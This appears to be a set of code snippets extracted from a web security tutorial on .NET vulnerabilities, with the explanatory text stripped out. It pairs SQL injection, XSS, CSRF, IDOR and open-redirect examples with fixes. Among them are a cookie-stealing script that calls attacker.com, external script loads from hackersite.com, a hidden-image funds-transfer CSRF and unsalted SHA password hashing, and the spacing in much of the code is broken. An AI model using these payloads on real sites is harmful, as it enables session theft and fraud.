["```cs\nmaster..sp_addextendedproc 'xp_webserver ', 'c:\\temp\\xp_tr.dll'—\n```", "```cs\n// Case 1\nvar connection = newOleDbConnection();\nstring query =\n\"SELECT account_balance FROM user_data WHERE user_name = ?\";\ntry\n{\n  OleDbCommand command = newOleDbCommand(query, connection);\n  command.Parameters.Add(newOleDbParameter(\"customerName\", txtCustomerName.Text));\n  OleDbDataReader reader = command.ExecuteReader();\n  // …\n}\ncatch (OleDbException ex)\n{\n  // Give some exception information\n}\n```", "```cs\n// Case 2\ntry\n{\n  SqlCommand command = newSqlCommand(\"sp_getAccountBalance\", connectionSQL);\n  command.CommandType = CommandType.StoredProcedure;\n  command.Parameters.Add(newSqlParameter(\"@CustomerName\", txtCustomerName.Text));\n  SqlDataReader reader = command.ExecuteReader();\n}\ncatch (Exception)\n{\n  throw;\n  // Give some excepcion information\n}\n```", "```cs\n// Case 3\nString tableName = \"\";\nswitch (tableName) { \n  case\"Customers\":\n    tableName = \"Customers\";\n  break;\n  case\"Balance\":\n    tableName = \"Balance\";\n  break;\n  // ...                \n  default: thrownewInputValidationException(\n    \"Invalid Table Name\");\n}\n```", "```cs\ndb.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } ); \n```", "```cs\n0; var date = new Date(); do { curDate = new Date(); } while (curDate - date < 10000)\n```", "```cs\npublicstaticbyte[] HashPassword(string password)\n{\n var provider = newSHA1CryptoServiceProvider();\n  var encoding = newUnicodeEncoding();\n  return provider.ComputeHash(encoding.GetBytes(password));\n}\n```", "```cs\npublicstaticbyte[] HashPassword256(string password)\n{\n  SHA256 mySHA256 = SHA256Managed.Create();\n  var encoding = newUnicodeEncoding();\n  return mySHA256.ComputeHash(encoding.GetBytes(password));\n}\n```", "```cs\n// Uncomment the following lines to enable logging in with third party\n//login providers\n//app.UseMicrosoftAccountAuthentication(\n//  clientId: \"\",\n//  clientSecret: \"\");\n\n//app.UseTwitterAuthentication(\n//  consumerKey: \"\",\n//  consumerSecret: \"\");\n\n//app.UseFacebookAuthentication(\n//  appId: \"\",\n//  appSecret: \"\");\n\n//app.UseGoogleAuthentication(new GoogleOAuth2AuthenticationOptions()\n//{\n//   ClientId = \"\",\n//  ClientSecret = \"\"\n//});\n```", "```cs\n\"<input name='creditcard' type='TEXT' value='\" + request.getParameter(\"CC\") + \"'>\";\n```", "```cs\n'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.\n```", "```cs\n<iframe src=\"img/hackersite.com\" height=\"400\" width=500/>\n```", "```cs\n\"></a><script src=\"img/dangerous_site.com\"></script><a href=\"\n```", "```cs\n<!-- Different DOM Based attacks -->\n<!-- External script -->\n<scriptsrc=http://hackersite.com/xss.js></script>\n<!-- <link> XSS -->\n<linkrel=\"stylesheet\"href=\"javascript:alert('XSS');\">\n<!-- <img> XSS -->\n<imgsrc=\"img/javascript:alert('XSS');\">\n<!-- <input> XSS -->\n<inputtype=\"image\"src=\"img/javascript:alert('XSS');\">\n<!-- <object> XSS -->\n<objecttype=\"text/x-scriptlet\"data=\"http://hackersite.com/xss.html\"/>\n```", "```cs\n<!-- <div> XSS -->\n<divstyle=\"background-image: url(javascript:alert('XSS'))\"></div>\n<!-- <div> XSS -->\n<divstyle=\"width: expression(alert('XSS'));\"></div>\n<!-- <table> XSS -->\n<tablebackground=\"javascript:alert('XSS')\">\n<!-- <td> XSS -->\n<tr><tdbackground=\"javascript:alert('XSS')\"></td></tr>\n</table>\n<!-- onload attribute -->\n<bodyonload=alert(\"XSS\")>\n<!-- background attribute -->\n<bodybackground=\"javascript:alert('XSS')\">\n```", "```cs\nString query = \"SELECT * FROM accts WHERE account = ?\";\nPreparedStatement pstmt =connection.prepareStatement(query , … );\npstmt.setString( 1, request.getParameter(\"accountNo\"));\nResultSet results = pstmt.executeQuery( );\n```", "```cs\nhttp://example.com/app/accountInfo?acct=AnotherAccountNo\n```", "```cs\n<!-- autocomplete (requires the element to have an id)-->\n<labelfor=\"CreditCardNo\">Autocomplete</label>\n<inputtype=\"text\"id=\"CreditCardNo\"autocomplete=\"on\"/>\n```", "```cs\nhttp://thesite.com/application?userId=1234\n```", "```cs\n<img src=\"img/transferFunds?amount=1500&destinationAccount=attackersAcct#\"width=\"0\" height=\"0\" />\n```", "```cs\n[ValidateAntiForgeryToken]\npublicActionResultMethodProtected()\n{\n  // some code\n}\n```", "```cs\n@Html.AntiForgeryToken()\n```", "```cs\n    http://www.example.com/redirect.aspx?url=evil.com\n\n    ```", "```cs\n    http://www.example.com/something.aspx?fwd=admin.aspx\n\n    ```"]